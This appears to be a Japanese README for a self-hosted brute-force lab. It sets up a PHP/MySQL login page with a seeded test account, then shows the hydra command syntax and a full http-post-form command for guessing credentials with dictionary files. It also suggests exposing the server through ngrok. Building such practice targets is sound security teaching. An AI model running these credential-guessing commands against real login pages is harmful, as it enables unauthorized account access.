# 使用するもの

- php 7.4以上
- mysql
- サーバーはご自由に


# 環境構築

## 専用のデータベースを作成する

ご自身のmysqlで好きな名前のデータベースを作成してください。
この例では、 brute_forceとします

```sql
CREATE DATABASE brute_force;
USE brute_force;
```


## テーブルを作成しデータをいれる

データベースに入って、SQL文でテーブルを作成します。

- ユーザーテーブルを作成

```sql
CREATE TABLE users (id INT(11) AUTO_INCREMENT PRIMARY KEY, email VARCHAR(191),password VARCHAR(191)) engine=innodb default charset=utf8;
```

- ユーザーテーブルにデータをいれる

※パスワードは「password」のハッシュにしている

```sql
INSERT INTO users(email,password) VALUES('test@test.com','$2y$10$UrkWlgzm4TrIFiYEZA9KVeHE3MKlP.uumWK6rxgQ7Q006g0MWTzfi');
```

## ライブラリをインストールする
データベースの情報をソースに直書きするわけにはいかないので、 機密情報をenvファイルにいれています。
そのためのライブラリをインストールします。

```bash
composer install
```

## envファイルを作成する
ルートディレクトリ（index.phpと同じ階層）に「.env」という名前のファイルを作成してください
中身はご自身のデータベース情報をいれてください。

```bash
DB_HOST=localhost
DB_NAME=brute_force
DB_USERNAME=root
DB_PASSWORD=
```

## サーバーを立ち上げてローカル環境で確認する

僕の場合はphpのビルトインサーバーを使用するので下記のコマンドでいけます。
※xamppなど自分が普段使っているものがあればそちらをご使用ください。

```bash
php -S 127.0.0.1:3000
```

これの場合は `http://127.0.0.1:3000` にアクセスして、ログインページが映ればOKです！


【ログイン情報】
メールアドレス: test@test.com
パスワード： password


# hydraでブルートフォース攻撃を行う

macの場合homebrewでインストールできます

```bash
brew install hydra
```

hydraはこのような構文でコマンドを打ちます

```bash
hydra -L {ユーザーIDの辞書ファイルへのパス} -P {パスワードの辞書ファイルへのパス}} {ドメインもしくはIPアドレス} http-post-form '{パス}:{ログインフォームのログインIDのname}=^USER^&{ログインフォームのパスワードのname}=^PASS^:{ログイン失敗時のメッセージ}'
```

なので実際はこのようになります

```bash
hydra -L files/id -P files/password example.com http-post-form '/login.php:email=^USER^&password=^PASS^:メールアドレスもしくはパスワードが異なります'
```

成功した場合は成功したログインIDとパスワードが表示されます。

<img width="1440" alt="スクリーンショット 2021-08-15 17 36 01" src="https://user-images.githubusercontent.com/36908016/129472541-57a3bb1e-ff53-4be3-8dcf-3686aba78391.png">



ちなみにポートは80番を想定しているようなのでローカルでは試せなさそうです。
何かのサーバーにアップしてからお試しください。
僕の場合はngrokを使用して試しています。
